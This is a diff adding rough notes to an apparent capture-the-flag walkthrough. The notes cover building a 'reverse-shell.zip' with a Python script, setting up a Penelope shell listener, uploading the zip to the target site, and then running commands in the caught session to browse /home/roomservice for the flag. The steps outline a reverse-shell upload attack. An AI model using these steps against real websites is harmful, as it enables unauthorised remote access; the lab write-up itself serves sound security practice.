@@ -181,6 +181,7 @@ We will now try to access the hooks folder
 
 build_shell.py
 
+Break this down (to further explain)
 ```
 import json
 import zipfile
@@ -213,6 +214,35 @@ with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
 
 print("Created reverse-shell.zip")
 ```
+
+```python3 build_shell.py```
+
+```unzip -l reverse-shell.zip```
+
+we now know the position of the hook folder 
+
+
+(Let's try to use other rather than penelope) 
+Penelope shell handler (this just create a shell?) 
+``` wget --- penelope.py```
+This setups the listener or for the shell 
+
+
+
+Upload the reverse-shell.zip to the website 
+
+
+
+go back to penelope 
+
+> sessions 1
+> id
+> ls -la
+> ls -la /home
+> > ls -la /home/roomservice 
+
+We nbow have the falg. 
+
 
 
 
